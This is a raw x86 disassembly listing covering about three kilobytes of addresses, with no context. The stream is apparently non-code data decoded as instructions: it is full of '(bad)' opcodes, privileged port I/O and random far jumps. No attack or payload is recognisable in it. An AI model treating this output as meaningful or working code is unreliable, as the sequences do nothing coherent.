  420dbd:	ins    DWORD PTR es:[edi],dx
  420dbe:	xor    ebp,DWORD PTR [edx]
  420dc0:	jmp    0xdd29:0xa0f59f23
  420dc7:	jmp    0x420d86
  420dc9:	dec    edx
  420dca:	jnp    0x420db6
  420dcc:	test   BYTE PTR [esi-0xbbf0000],ch
  420dd2:	dec    esp
  420dd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dd4:	add    BYTE PTR [eax],al
  420dd6:	mov    dh,0xd9
  420dd8:	fwait
  420dd9:	out    dx,al
  420dda:	push   es
  420ddb:	jl     0x420e2e
  420ddd:	pop    ss
  420dde:	cli    
  420ddf:	arpl   dx,bp
  420de1:	adc    DWORD PTR [eax],edx
  420de3:	mov    WORD PTR ds:0x270c0000,?
  420de9:	add    BYTE PTR [eax],al
  420deb:	ret    0x1412
  420dee:	or     BYTE PTR [edi+0x0],ch
  420df1:	add    BYTE PTR [edi-0x52a54dcd],ch
  420df7:	cdq    
  420df8:	daa    
  420df9:	mov    gs,WORD PTR [esi]
  420dfb:	inc    BYTE PTR [esi-0x72]
  420dfe:	retf   0x7639
  420e01:	jl     0x420e38
  420e03:	cdq    
  420e04:	xor    BYTE PTR [ebp+0x5e],bh
  420e07:	mov    edi,0xbc29cf79
  420e0c:	aam    0x8b
  420e0e:	pop    ebp
  420e0f:	enter  0xcb,0x0
  420e13:	popf   
  420e14:	push   ds
  420e15:	jmp    0x59ad0473
  420e1a:	and    al,0xe2
  420e1c:	enter  0xa3,0x0
  420e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e21:	enter  0x44,0x0
  420e25:	push   ecx
  420e26:	cli    
  420e27:	dec    esp
  420e28:	mov    ds:0xc1470000,al
  420e2d:	or     eax,0xa8349950
  420e32:	lea    ecx,[ebx]
  420e34:	rcr    ecx,0x18
  420e37:	push   0xec89e7e5
  420e3c:	adc    eax,0x905cbcda
  420e41:	mov    DWORD PTR [ebp+0x43],edi
  420e44:	adc    dh,BYTE PTR [edx-0x2bd37664]
  420e4a:	stc    
  420e4b:	pop    esp
  420e4c:	push   esi
  420e4d:	cmp    al,0x23
  420e4f:	pop    ss
  420e50:	in     eax,0xfc
  420e52:	mov    ds:0x500ec21e,eax
  420e57:	pop    esi
  420e58:	ja     0x420ed4
  420e5a:	cld    
  420e5b:	mov    esp,0x185cb570
  420e60:	add    BYTE PTR [ebp+0x3ca40000],dh
  420e66:	aas    
  420e67:	pusha  
  420e68:	imul   ecx,ecx,0xffffffeb
  420e6b:	add    al,0xab
  420e6d:	add    BYTE PTR [eax],al
  420e6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e70:	mov    esp,ecx
  420e72:	jle    0x420e36
  420e74:	mov    eax,0x9e04ce
  420e79:	add    BYTE PTR [ecx+0x3828cbf1],al
  420e7f:	add    ebp,DWORD PTR [esi-0x30b519a4]
  420e85:	add    ebp,ebx
  420e87:	push   es
  420e88:	imul   cl
  420e8a:	sub    DWORD PTR [eax-0x6455cd26],ebx
  420e90:	adc    eax,0x40a7fb63
  420e95:	iret   
  420e96:	add    BYTE PTR [eax],al
  420e98:	sar    DWORD PTR [ebx+0x7f],1
  420e9b:	push   ebx
  420e9c:	in     eax,0xd9
  420e9e:	sub    al,0xd2
  420ea0:	mov    BYTE PTR [ebx-0x649a0000],ch
  420ea6:	dec    ebx
  420ea7:	enter  0x96,0x0
  420eab:	xchg   ebx,eax
  420eac:	test   al,0x8b
  420eae:	js     0x420eaa
  420eb0:	xchg   ebx,eax
  420eb1:	dec    edi
  420eb2:	pushf  
  420eb3:	dec    esp
  420eb4:	aas    
  420eb5:	add    BYTE PTR [eax],al
  420eb7:	or     BYTE PTR [edi],dl
  420eb9:	add    BYTE PTR [eax],al
  420ebb:	mov    ecx,0x890f1207
  420ec0:	shl    DWORD PTR [ecx+0x5a],1
  420ec3:	int    0xd3
  420ec5:	repz cdq 
  420ec7:	lahf   
  420ec8:	or     bl,0x0
  420ecb:	add    BYTE PTR [eax+0xf8093b1],ch
  420ed1:	add    BYTE PTR [eax],al
  420ed3:	fdecstp 
  420ed5:	adc    BYTE PTR [esi],0xe1
  420ed8:	push   0xa1d06bef
  420edd:	push   ebp
  420ede:	push   ecx
  420edf:	icebp  
  420ee0:	div    DWORD PTR [esi+0x34]
  420ee3:	mov    edx,0x8fad2c7c
  420ee8:	in     eax,0x26
  420eea:	adc    BYTE PTR [ebx],0x1a
  420eed:	and    BYTE PTR [eax],dh
  420eef:	sub    cl,bl
  420ef1:	inc    ebx
  420ef2:	inc    esi
  420ef3:	mov    ah,0x2c
  420ef5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ef6:	or     al,0x50
  420ef8:	add    BYTE PTR [eax],al
  420efa:	dec    esi
  420efb:	mov    edi,0x3360b195
  420f00:	shl    DWORD PTR [esi+0x6a],1
  420f03:	ins    BYTE PTR es:[edi],dx
  420f04:	jnp    0x420eac
  420f06:	clc    
  420f07:	mov    ebx,0xf7a21bf2
  420f0c:	shrd   DWORD PTR [edi+0x6d],edi,cl
  420f10:	xchg   DWORD PTR [esp+ebp*2+0x3a],esp
  420f14:	mov    ch,0x1b
  420f16:	jnp    0x420ec0
  420f18:	lds    ecx,FWORD PTR [esi]
  420f1a:	sub    eax,0xa08c35
  420f1f:	add    bl,dl
  420f21:	aaa    
  420f22:	call   0xdb898ed2
  420f27:	mov    bl,0xf7
  420f29:	push   ebp
  420f2a:	jmp    0x420edc
  420f2c:	push   cs
  420f2d:	push   esi
  420f2e:	call   0x3546:0xb23029d0
  420f35:	pop    ss
  420f36:	and    BYTE PTR [ebx+esi*4-0x64],bh
  420f3a:	add    eax,0xbb65f1e0
  420f3f:	jno    0x420f8e
  420f41:	push   esp
  420f42:	push   ebx
  420f43:	or     BYTE PTR [eax+eax*1-0x2e8ffb00],ah
  420f4a:	pop    edx
  420f4b:	vmread DWORD PTR [edx],eax
  420f4e:	mov    esp,0xf5c1f497
  420f53:	js     0x420fce
  420f55:	pop    eax
  420f56:	mov    dl,0xec
  420f58:	xor    edx,DWORD PTR [edx]
  420f5a:	enter  0xb3,0x0
  420f5e:	pop    esp
  420f5f:	xchg   DWORD PTR [ecx-0xc6bb98c],edi
  420f65:	test   eax,0x253d414f
  420f6a:	jmp    0x420f33
  420f6c:	or     ebp,DWORD PTR [ebp-0x483e0295]
  420f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f73:	hlt    
  420f74:	jge    0x420f97
  420f76:	mov    ebp,0xf5e9630b
  420f7b:	dec    edx
  420f7c:	inc    esi
  420f7d:	dec    edx
  420f7e:	xor    edx,DWORD PTR [edi+ebx*2]
  420f81:	fld    QWORD PTR [ebx-0x6435290b]
  420f87:	sbb    BYTE PTR [eax+0x4f8cc6fb],bh
  420f8d:	add    BYTE PTR [eax],al
  420f8f:	adc    BYTE PTR [ebx],dl
  420f91:	sbb    al,0x7d
  420f93:	and    ebx,DWORD PTR [esp+ebx*2+0x40048f]
  420f9a:	add    BYTE PTR [edi-0x1b],bl
  420f9d:	ret    
  420f9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f9f:	xchg   BYTE PTR [eax-0x7b],dl
  420fa2:	cmp    DWORD PTR [eax],0x72a037aa
  420fa8:	popa   
  420fa9:	or     al,BYTE PTR [ecx+0x2f]
  420fac:	jmp    0xbb9c2ad8
  420fb1:	push   ebx
  420fb2:	outs   dx,BYTE PTR ds:[esi]
  420fb3:	mov    al,ds:0x164c
  420fb8:	adc    ebx,DWORD PTR [ebx-0x27880e91]
  420fbe:	xchg   ebp,eax
  420fc0:	sub    DWORD PTR [ecx],edi
  420fc2:	daa    
  420fc3:	xor    al,0x4
  420fc5:	fiadd  WORD PTR [eax]
  420fc7:	add    bl,cl
  420fc9:	stos   DWORD PTR es:[edi],eax
  420fca:	xchg   dl,cl
  420fcc:	ins    BYTE PTR es:[edi],dx
  420fcd:	call   0x42a292
  420fd2:	(bad)  
  420fd3:	bound  ebp,QWORD PTR [ebp+0x6c085ee0]
  420fd9:	add    BYTE PTR [eax],al
  420fdb:	mov    eax,0xdd33455b
  420fe0:	add    al,0x68
  420fe2:	add    BYTE PTR [eax],al
  420fe4:	rol    ah,cl
  420fe6:	mov    bh,0x0
  420fe8:	add    BYTE PTR [ebx-0x5c],bh
  420feb:	pop    es
  420fec:	sub    al,0xa8
  420fee:	(bad)  
  420fef:	std    
  420ff0:	add    ebx,DWORD PTR [esi]
  420ff2:	mov    esp,0xb260c1c5
  420ff7:	sub    al,0x7a
  420ff9:	shl    ch,cl
  420ffb:	stc    
  420ffc:	out    dx,eax
  420ffd:	jno    0x420f89
  420fff:	push   eax
  421000:	retf   
  421001:	mov    dl,0x92
  421003:	inc    eax
  421004:	sti    
  421005:	add    BYTE PTR [eax],al
  421007:	fcmovnu st,st(6)
  421009:	fcomp  DWORD PTR [edx-0x339dfc9d]
  42100f:	bound  eax,QWORD PTR [eax]
  421011:	add    dl,ch
  421013:	sbb    eax,0x38c9b190
  421018:	mov    eax,0x90e8d0fd
  42101d:	sbb    al,0x97
  42101f:	jno    0x421055
  421021:	fisttp QWORD PTR [esi]
  421023:	data16 lahf 
  421025:	in     al,0xbf
  421027:	add    al,0xaa
  421029:	add    BYTE PTR [eax],al
  42102b:	mov    bl,0x50
  42102d:	sbb    DWORD PTR [edx-0x4e],ebx
  421030:	pop    ds
  421031:	ins    DWORD PTR es:[edi],dx
  421032:	out    dx,al
  421033:	outs   dx,DWORD PTR gs:[esi]
  421035:	jle    0x420fef
  421037:	push   0x7d48
  42103c:	pop    esp
  42103d:	mov    ebp,0xc57d3297
  421042:	adc    BYTE PTR [esi+0xfd48e4],cl
  421048:	add    BYTE PTR [ebx+0x15e8fa8b],ah
  42104e:	push   edi
  42104f:	push   edi
  421050:	jne    0x421068
  421052:	or     edx,DWORD PTR [ecx+0x53]
  421055:	repz (bad) 
  421057:	popf   
  421058:	fld    TBYTE PTR [ebp-0x7d]
  42105b:	jmp    0xf16b76a5
  421060:	inc    edx
  421061:	cmc    
  421062:	in     eax,0xbf
  421064:	push   esi
  421065:	pop    esi
  421066:	pop    ebx
  421067:	sbb    ah,BYTE PTR [ebx-0x4a]
  42106a:	mov    esi,0x9484
  42106f:	xchg   DWORD PTR [eax+0x7a],ebp
  421072:	jecxz  0x4210d7
  421074:	ficomp DWORD PTR gs:0x53929554
  42107b:	push   edi
  42107c:	and    al,0xd8
  42107e:	push   ebx
  42107f:	mov    es,ecx
  421081:	xchg   BYTE PTR [ecx*2+0x130c0000],cl
  421088:	add    BYTE PTR [eax],al
  42108a:	outs   dx,BYTE PTR ds:[esi]
  42108b:	cdq    
  42108c:	bound  bp,DWORD PTR [edi]
  42108f:	cmp    eax,0x6b5843e0
  421094:	and    DWORD PTR [ecx+esi*2+0x6cde467],esi
  42109b:	dec    edx
  42109c:	in     al,0xf1
  42109e:	pop    edx
  42109f:	jg     0x421064
  4210a1:	sahf   
  4210a2:	in     al,0xe4
  4210a4:	xchg   esi,eax
  4210a5:	aam    0xfe
  4210a7:	add    edi,DWORD PTR [ebx]
  4210a9:	inc    eax
  4210aa:	into   
  4210ab:	add    BYTE PTR [eax],al
  4210ad:	jp     0x4210ae
  4210af:	pop    ds
  4210b0:	adc    al,0x12
  4210b2:	(bad)  
  4210b3:	arpl   WORD PTR [ebx+eax*8],dx
  4210b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210b7:	(bad)  
  4210b8:	cmc    
  4210b9:	fsubr  QWORD PTR [ecx+ebx*4+0x18]
  4210bd:	push   eax
  4210be:	stc    
  4210bf:	out    0x6a,eax
  4210c1:	or     BYTE PTR [edi+0x0],dl
  4210c4:	add    BYTE PTR [edx],cl
  4210c6:	xchg   edi,eax
  4210c7:	cli    
  4210c8:	mov    ebx,0xa87ac79d
  4210cd:	jnp    0x42105c
  4210cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210d0:	nop
  4210d1:	mov    eax,fs:0x24699d07
  4210d7:	xchg   BYTE PTR [ebx-0x12abe932],dl
  4210dd:	lds    esi,FWORD PTR [ebx]
  4210df:	mov    al,0x18
  4210e1:	push   edx
  4210e2:	imul   esp,DWORD PTR [ebx-0x3ac425d0],0xf0e0daa0
  4210ec:	push   0x2669992a
  4210f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210f2:	stos   DWORD PTR es:[edi],eax
  4210f3:	ficomp DWORD PTR [eax-0x60]
  4210f6:	push   cs
  4210f7:	adc    BYTE PTR [ecx+0x6f9ea015],al
  4210fd:	xor    al,0x1d
  4210ff:	mov    BYTE PTR [eax],al
  421101:	add    BYTE PTR [eax],al
  421103:	dec    eax
  421104:	retf   0x0
  421107:	scas   eax,DWORD PTR es:[edi]
  421108:	adc    al,0x11
  42110a:	mov    eax,ds:0xed882b
  42110f:	add    ch,ch
  421111:	sbb    bh,BYTE PTR [esi+ecx*8+0x5f12b3ba]
  421118:	push   ecx
  421119:	leave  
  42111a:	adc    edx,DWORD PTR [eax+0x3f]
  42111d:	(bad)  
  42111e:	pop    eax
  42111f:	jmp    0x42114f
  421121:	xor    DWORD PTR [edi],edi
  421123:	sbb    eax,0xfdae6a11
  421128:	xchg   ebx,eax
  421129:	outs   dx,BYTE PTR ds:[esi]
  42112a:	add    cl,bl
  42112c:	mov    esp,0x8bd2ba82
  421131:	mov    ebp,cs
  421133:	add    BYTE PTR [eax],al
  421135:	pop    esp
  421136:	std    
  421137:	sub    DWORD PTR [eax-0x51c0eaae],edi
  42113d:	inc    ebx
  42113e:	test   eax,0xe19c9552
  421143:	aad    0xee
  421145:	das    
  421146:	stos   DWORD PTR es:[edi],eax
  421147:	(bad)  
  421148:	jns    0x4211b1
  42114a:	ins    DWORD PTR es:[edi],dx
  42114b:	push   cs
  42114c:	addr16 call 0xd9d6f962
  421152:	in     al,dx
  421153:	call   0x26e2:0xfd38a78b
  42115a:	pop    edi
  42115b:	inc    eax
  42115c:	int3   
  42115d:	add    BYTE PTR [eax],al
  42115f:	mov    ch,0xbd
  421161:	push   0x65
  421163:	xchg   DWORD PTR [ecx+0x6da806c5],ecx
  421169:	adc    edi,edx
  42116b:	xchg   ecx,eax
  42116c:	int    0x3a
  42116e:	das    
  42116f:	lock adc al,0xf8
  421172:	cmp    ebx,ecx
  421174:	mov    dl,0xb
  421176:	(bad)  
  421178:	rol    DWORD PTR [ebp+0x5c],cl
  42117b:	mov    ch,0xf1
  42117d:	add    dl,BYTE PTR [edi+eax*4-0x5f]
  421181:	dec    eax
  421182:	outs   dx,BYTE PTR ds:[esi]
  421183:	add    BYTE PTR [eax],al
  421185:	mov    bh,dl
  421187:	add    BYTE PTR [eax],al
  421189:	stos   DWORD PTR es:[edi],eax
  42118a:	push   es
  42118b:	fmul   QWORD PTR ds:0xf52cb60f
  421191:	dec    edi
  421192:	jb     0x421175
  421194:	pop    edx
  421195:	std    
  421196:	adc    dh,dh
  421198:	or     DWORD PTR [ebx-0x5e],eax
  42119b:	les    edx,FWORD PTR cs:[eax]
  42119e:	add    BYTE PTR [eax],al
  4211a0:	fwait
  4211a1:	repnz pusha 
  4211a3:	and    eax,0x1847bc7a
  4211a8:	push   ecx
  4211a9:	inc    esi
  4211aa:	push   0x4f
  4211ac:	repz inc ebp
  4211ae:	test   al,0xc3
  4211b0:	arpl   ax,bx
  4211b2:	fist   DWORD PTR [ecx]
  4211b4:	xchg   ebx,eax
  4211b5:	push   edx
  4211b6:	or     DWORD PTR [edx+0x1b],0x17
  4211ba:	fadd   st,st(1)
  4211bc:	jne    0x421178
  4211be:	adc    dl,BYTE PTR [edi+ecx*2]
  4211c1:	aam    0xe3
  4211c3:	dec    edi
  4211c4:	cmp    bl,BYTE PTR [esi+ecx*8-0xe63d22f]
  4211cb:	aas    
  4211cc:	mul    DWORD PTR [eax]
  4211ce:	dec    edi
  4211cf:	clc    
  4211d0:	cmp    BYTE PTR [eax+ebx*1+0x1f451918],0xb7
  4211d8:	sub    BYTE PTR [ecx-0x3c],bl
  4211db:	jb     0x4211dd
  4211dd:	add    BYTE PTR [edx-0x48],dh
  4211e0:	jg     0x42121b
  4211e2:	aam    0x8f
  4211e4:	sbb    BYTE PTR [esi],bh
  4211e6:	ffree  st(1)
  4211e8:	and    bl,BYTE PTR [ebp+0x2a21d2e2]
  4211ee:	mov    DWORD PTR [eax+0x30f8ee2f],edi
  4211f4:	lods   eax,DWORD PTR ds:[esi]
  4211f5:	repz jo 0x4211da
  4211f8:	call   0x42a4bd
  4211fd:	fisub  DWORD PTR [edi]
  4211ff:	inc    esi
  421200:	sbb    eax,0x7d16b698
  421205:	cmp    esi,edx
  421207:	sub    eax,0x52073911
  42120c:	outs   dx,BYTE PTR ds:[esi]
  42120d:	ror    BYTE PTR [edi+0x40],cl
  421210:	add    al,0x0
  421212:	add    BYTE PTR [ecx],ah
  421214:	in     eax,0xa3
  421216:	push   edi
  421217:	cmp    esp,eax
  421219:	inc    esi
  42121a:	mov    ebp,DWORD PTR [eax]
  42121c:	fldenv [ebx]
  42121e:	push   es
  42121f:	into   
  421220:	mov    edx,DWORD PTR [edi+0x76c7fd13]
  421226:	dec    ecx
  421227:	push   ecx
  421228:	xchg   ebx,eax
  421229:	dec    edi
  42122a:	ja     0x4211cd
  42122c:	push   ebp
  42122d:	mov    eax,ds:0x6beb4d6e
  421232:	inc    edx
  421233:	mov    esp,0x9c69a462
  421238:	mov    edi,0x42e0f42c
  42123d:	inc    ecx
  42123e:	les    ebx,FWORD PTR [edi-0x7d930000]
  421244:	test   DWORD PTR [ebx-0x5],edi
  421247:	out    0xdb,al
  421249:	(bad)  
  42124a:	js     0x421239
  42124c:	icebp  
  42124d:	add    eax,0x48c
  421252:	stos   DWORD PTR es:[edi],eax
  421253:	add    BYTE PTR [edi],bl
  421255:	add    BYTE PTR [eax],al
  421257:	cdq    
  421258:	shr    BYTE PTR [eax],0x0
  42125b:	add    bh,dh
  42125d:	adc    BYTE PTR [ebx+0xd4861],bl
  421263:	add    BYTE PTR [ebp+0xb8d0546],bh
  421269:	xchg   edx,eax
  42126a:	(bad)  
  42126b:	mov    eax,0x46b5dc11
  421270:	bound  esp,QWORD PTR [ebx+0x2dcaed96]
  421276:	mov    ds,WORD PTR [ebp+edx*8+0x62]
  42127a:	stc    
  42127b:	lods   eax,DWORD PTR ds:[esi]
  42127c:	dec    esi
  42127d:	sbb    ebp,DWORD PTR [ebx+0x5764517c]
  421283:	mov    edx,0xecab2b76
  421288:	imul   edx,DWORD PTR [ebx+0xc200],0xffffff99
  42128f:	xor    eax,0x9cbbe99f
  421294:	cmp    ch,BYTE PTR [edi]
  421296:	ret    0x84a8
  421299:	sbb    al,BYTE PTR [eax]
  42129b:	add    BYTE PTR [ecx+0x75af9694],bh
  4212a1:	icebp  
  4212a2:	push   ds
  4212a3:	push   DWORD PTR [ebp-0x58f7494e]
  4212a9:	add    BYTE PTR [eax],al
  4212ab:	dec    eax
  4212ac:	out    0x0,al
  4212ae:	add    BYTE PTR [eax],dh
  4212b0:	out    0xab,eax
  4212b2:	dec    edx
  4212b3:	mov    edi,0x364c
  4212b8:	jp     0x421295
  4212ba:	cdq    
  4212bb:	xchg   edx,eax
  4212bc:	push   ecx
  4212bd:	(bad)  
  4212be:	and    BYTE PTR [ebx+eax*1+0x7f],ah
  4212c2:	jg     0x421308
  4212c4:	mov    ch,0x0
  4212c6:	add    BYTE PTR [edx-0xcc83406],bl
  4212cc:	loope  0x4212fe
  4212ce:	fcmovu st,st(7)
  4212d0:	adc    BYTE PTR [ebx+0x21],dl
  4212d3:	xchg   edx,eax
  4212d4:	adc    al,BYTE PTR [eax+0x58]
  4212d7:	add    BYTE PTR [eax],al
  4212d9:	out    0xc4,al
  4212db:	in     eax,0x0
  4212dd:	add    BYTE PTR [eax-0x45ffff6e],cl
  4212e3:	ja     0x421267
  4212e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212e6:	cdq    
  4212e7:	mov    ebp,0x994803ae
  4212ec:	add    BYTE PTR [eax],al
  4212ee:	into   
  4212ef:	ss or  ebx,esp
  4212f2:	(bad)  
  4212f3:	pinsrw mm7,WORD PTR [esi+0x0],0x0
  4212f8:	mov    ah,0x60
  4212fa:	inc    eax
  4212fb:	push   esp
  4212fc:	add    BYTE PTR [eax],al
  4212fe:	int3   
  4212ff:	dec    eax
  421300:	add    BYTE PTR [eax],al
  421302:	lods   eax,DWORD PTR ds:[esi]
  421303:	cmp    DWORD PTR [ebx-0x4b],edx
  421306:	dec    edx
  421307:	call   0xb575:0xf719b70e
  42130e:	adc    bl,BYTE PTR [ebp+0x5fee2605]
  421314:	xor    ebx,edx
  421316:	fld    QWORD PTR [eax]
  421318:	jno    0x42131a
  42131a:	add    dl,dl
  42131c:	nop
  42131d:	fcom   DWORD PTR [ebp+0x344ed]
  421323:	add    dh,ah
  421325:	mov    esp,0x814e1406
  42132a:	mov    bh,0x10
  42132c:	and    al,0x55
  42132e:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  421330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421331:	inc    esi
  421332:	xor    BYTE PTR ds:0x818f9b35,dl
  421338:	cwde   
  421339:	mov    dl,0x2f
  42133b:	scas   al,BYTE PTR es:[edi]
  42133c:	rol    DWORD PTR [ebx+0x7],0x4f
  421340:	sub    al,BYTE PTR [ebp-0x3c1919b]
  421346:	xchg   DWORD PTR [ebp-0x6b],ebx
  421349:	inc    ecx
  42134a:	mov    bl,0x0
  42134c:	ret    0x0
  42134f:	xchg   esp,eax
  421350:	jnp    0x421359
  421352:	test   bl,ch
  421354:	add    BYTE PTR [eax],al
  421356:	xor    BYTE PTR [eax-0x46],cl
  421359:	add    BYTE PTR [eax],al
  42135b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42135c:	mov    al,0x4b
  42135e:	xor    bl,dh
  421360:	jno    0x421357
  421362:	imul   eax,DWORD PTR [ebx+0x36ab4f78],0xffffff82
  421369:	frstor [eax-0x2cbaf0f7]
  42136f:	leave  
  421370:	pop    ecx
  421371:	outs   dx,DWORD PTR ds:[esi]
  421372:	adc    eax,DWORD PTR [esi+esi*8]
  421375:	add    BYTE PTR [eax],al
  421377:	int    0xcf
  421379:	pop    esp
  42137a:	dec    esi
  42137b:	jns    0x4213f4
  42137d:	xor    ecx,ebp
  42137f:	cmp    bh,BYTE PTR [ebx+eax*4+0x1ebfe5dd]
  421386:	(bad)  
  421388:	inc    ebx
  421389:	ret    
  42138a:	inc    eax
  42138b:	jmp    0x42138d
  42138d:	add    BYTE PTR [ebp-0x80],ch
  421390:	inc    ebp
  421391:	add    BYTE PTR [eax],al
  421393:	imul   ebp,DWORD PTR [ecx-0x60],0xc988c7
  42139a:	add    BYTE PTR [ebx+0x1bbe06b8],dl
  4213a0:	lahf   
  4213a1:	inc    esi
  4213a2:	mov    bl,0xcf
  4213a4:	call   0x750b:0xb8795599
  4213ab:	in     eax,0x66
  4213ad:	loopne 0x42140e
  4213af:	lods   eax,DWORD PTR ds:[esi]
  4213b0:	sar    DWORD PTR [ebx],1
  4213b2:	repz push cs
  4213b4:	jge    0x4213d7
  4213b6:	mov    eax,0x7d9c1b32
  4213bb:	add    eax,DWORD PTR [ebp+0x5]
  4213be:	pusha  
  4213bf:	sbb    al,0x75
  4213c1:	sub    al,BYTE PTR [ebx+0xe]
  4213c4:	daa    
  4213c5:	jmp    0xcaea:0x5ae62141
  4213cc:	add    BYTE PTR [edi+0x0],al
  4213cf:	add    ch,dl
  4213d1:	jl     0x4213a5
  4213d3:	int3   
  4213d4:	jecxz  0x4213d6
  4213d6:	add    BYTE PTR [eax-0x19],bl
  4213d9:	ja     0x4213db
  4213db:	mov    eax,0xa5c60000
  4213e0:	ret    0xd7a3
  4213e3:	mov    dh,0x7e
  4213e5:	clc    
  4213e6:	es cld 
  4213e8:	imul   ecx,edi,0xa39fd3b2
  4213ee:	repnz mov ch,0xcb
  4213f1:	jbe    0x4213a8
  4213f3:	scas   al,BYTE PTR es:[edi]
  4213f4:	out    dx,al
  4213f5:	shl    BYTE PTR [ecx],1
  4213f7:	pop    edx
  4213f8:	in     al,dx
  4213f9:	in     eax,0x24
  4213fb:	mov    dl,0x5
  4213fd:	xor    BYTE PTR [esi+0x57],al
  421400:	pop    eax
  421401:	dec    esi
  421402:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421403:	and    eax,0xa4e2472d
  421408:	or     DWORD PTR [eax+0x79df2875],esp
  42140e:	addr16 test eax,0x261494bb
  421414:	pop    ebx
  421415:	mov    edx,0x39f9ecf0
  42141a:	dec    BYTE PTR [esp+ebx*1+0xf7f0000]
  421421:	in     eax,0x6d
  421423:	xor    BYTE PTR [edx-0x2b536914],bl
  421429:	into   
  42142a:	nop
  42142b:	cld    
  42142c:	cmp    DWORD PTR [edx-0x210ac3d4],0xe8f43e85
  421436:	cmp    BYTE PTR [esi+0x30d0076d],bl
  42143c:	sahf   
  42143d:	dec    ebx
  42143e:	(bad)  
  42143f:	(bad)  
  421440:	jmp    0x4213f7
  421442:	loopne 0x421490
  421444:	rol    DWORD PTR [eax],0x0
  421447:	das    
  421448:	dec    ebp
  421449:	imul   esi,DWORD PTR [esi+eax*2-0x61],0xc4158664
  421451:	test   DWORD PTR [eax],eax
  421453:	add    BYTE PTR [edi],dl
  421455:	jnp    0x421470
  421457:	xlat   BYTE PTR ds:[ebx]
  421458:	xchg   ecx,eax
  421459:	(bad)  
  42145b:	xor    DWORD PTR [edx-0x6b6fa8e9],ecx
  421461:	mov    eax,ds:0xb464d956
  421466:	inc    edi
  421467:	ds sub eax,0x719ab06b
  42146d:	mov    ds:0xd9c4,al
  421472:	add    al,0xe5
  421474:	add    BYTE PTR [eax],al
  421476:	fisub  DWORD PTR [ebp-0x69]
  421479:	fidivr WORD PTR [edi-0x23200873]
  42147f:	mov    ch,0x22
  421481:	ins    DWORD PTR es:[edi],dx
  421482:	sub    ah,BYTE PTR [ebp-0x5204c5a9]
  421488:	adc    dh,BYTE PTR [edi-0x5e45e2bb]
  42148e:	mov    edx,0x645b5d01
  421493:	mov    esp,0x470cee
  421498:	add    BYTE PTR [edx],ah
  42149a:	popf   
  42149b:	xchg   BYTE PTR [ebx+0x28],al
  42149e:	cli    
  42149f:	cmp    DWORD PTR [esi],edi
  4214a1:	push   eax
  4214a2:	mov    WORD PTR [ebx],ds
  4214a4:	add    BYTE PTR [eax],al
  4214a6:	out    0x4d,al
  4214a8:	fst    QWORD PTR [esi+0x780b2617]
  4214ae:	xor    al,0x9c
  4214b0:	cwde   
  4214b1:	push   ebx
  4214b2:	add    DWORD PTR [ebx],0x1da802a5
  4214b8:	jle    0x4214e8
  4214ba:	push   ss
  4214bb:	in     al,dx
  4214bc:	nop
  4214bd:	dec    edi
  4214be:	leave  
  4214bf:	outs   dx,BYTE PTR ds:[esi]
  4214c0:	xchg   edx,eax
  4214c1:	dec    esp
  4214c2:	dec    edx
  4214c3:	add    BYTE PTR [eax],al
  4214c5:	dec    ecx
  4214c6:	or     bh,BYTE PTR [ebp+0x2d]
  4214c9:	mov    al,ds:0x3f9ce3b
  4214ce:	sar    BYTE PTR [edi],1
  4214d0:	xor    dh,bh
  4214d2:	js     0x42150c
  4214d4:	inc    ebp
  4214d5:	icebp  
  4214d6:	xchg   DWORD PTR ds:0xd3c40b,ecx
  4214dc:	add    BYTE PTR [esi+0x73ae3bf7],bh
  4214e2:	push   es
  4214e3:	xchg   esp,eax
  4214e4:	mov    WORD PTR [edx+0x0],ss
  4214e7:	add    BYTE PTR [eax-0x60ab3d16],bl
  4214ed:	ret    0x511c
  4214f0:	or     ch,BYTE PTR [ecx-0x53]
  4214f3:	aam    0x8a
  4214f5:	mov    edx,DWORD PTR [esi-0x77]
  4214f8:	mov    dh,0x6f
  4214fa:	inc    esp
  4214fb:	dec    esi
  4214fc:	add    BYTE PTR [eax],al
  4214fe:	(bad)  
  4214ff:	rcl    DWORD PTR [edi],cl
  421501:	retf   0xa994
  421504:	shl    BYTE PTR [ecx],1
  421506:	or     eax,0xe6faf603
  42150b:	xchg   ebx,eax
  42150c:	call   FWORD PTR [eax]
  42150e:	push   eax
  42150f:	fadd   st(1),st
  421511:	push   cs
  421512:	sub    bl,ah
  421514:	mov    ds:0x76c585a8,al
  421519:	into   
  42151a:	sub    eax,0x956b4177
  42151f:	fcomp  DWORD PTR [ecx+ebp*8]
  421522:	pop    ds
  421523:	add    DWORD PTR [edx+0x0],esi
  421526:	xlat   BYTE PTR ds:[ebx]
  421527:	add    BYTE PTR [eax],al
  421529:	mov    edi,DWORD PTR [ecx+0x1ee594f1]
  42152f:	add    esi,edi
  421531:	xchg   ecx,eax
  421532:	xchg   ebx,eax
  421533:	pop    edi
  421534:	or     ecx,DWORD PTR [edi+0x4b]
  421537:	mov    esi,0xf76fff8
  42153c:	or     edi,ebp
  42153e:	cmp    DWORD PTR [edi],ebp
  421540:	rol    BYTE PTR [ebx+0x2],1
  421543:	cmp    BYTE PTR [edi],dl
  421545:	mov    DWORD PTR [edi+0x48],ebp
  421548:	and    eax,DWORD PTR [eax]
  42154a:	add    BYTE PTR [esi+0xaa40],bh
  421550:	mov    BYTE PTR [edi+0x0],cl
  421553:	add    BYTE PTR [esi-0x7d],dh
  421556:	push   ebx
  421557:	xchg   esp,eax
  421558:	ins    DWORD PTR es:[edi],dx
  421559:	popf   
  42155a:	mov    cl,0x10
  42155c:	aad    0x42
  42155e:	das    
  42155f:	test   DWORD PTR [edi],esp
  421561:	sub    al,0xfa
  421563:	into   
  421564:	lods   al,BYTE PTR ds:[esi]
